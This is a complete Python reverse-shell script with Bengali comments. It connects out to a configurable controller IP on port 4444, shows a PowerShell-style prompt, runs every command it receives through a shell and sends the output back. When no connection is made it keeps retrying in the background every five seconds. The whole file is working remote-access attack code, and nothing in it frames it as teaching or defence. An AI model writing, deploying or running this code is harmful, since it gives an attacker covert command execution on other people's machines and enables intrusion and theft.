#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time

# একই ডিভাইসে টেস্টের জন্য '127.0.0.1' রাখুন, আলাদা পিসির জন্য কন্ট্রোলারের আসল আইপি দিন
CONTROLLER_IP = "127.0.0.1" 
CONTROLLER_PORT = 4444

def connect_back():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CONTROLLER_IP, CONTROLLER_PORT))
        
        current_dir = os.getcwd()
        client.send(f"PS {current_dir}> ".encode('utf-8', errors='ignore'))
        
        while True:
            command = client.recv(4096).decode('utf-8', errors='ignore')
            if not command:
                break
                
            command = command.strip()
            if command.lower() == 'exit':
                sys.exit(0)
                
            try:
                # ডিরেক্টরি পরিবর্তনের জন্য 'cd' হ্যান্ডলিং
                if command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        result = ""
                    except Exception as e:
                        result = f"Error: {e}\n"
                else:
                    # ব্যাকগ্রাউন্ড এক্সিকিউশনের জন্য সেফ সাবপ্রসেস পাইপলাইন
                    output = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        text=True,
                        stdin=subprocess.DEVNULL
                    )
                    result = output.stdout + output.stderr
                    if not result:
                        result = "[+] Command executed successfully\n"
            except Exception as e:
                result = f"Error: {e}\n"
                
            current_dir = os.getcwd()
            send_back = f"{result}PS {current_dir}> "
            client.send(send_back.encode('utf-8', errors='ignore'))
            
        client.close()
    except Exception:
        # কানেকশন না পেলে প্রতি ৫ সেকেন্ড পর পর ব্যাকগ্রাউন্ডে ট্রাই করতে থাকবে
        time.sleep(5)
        connect_back()

if __name__ == "__main__":
    connect_back()
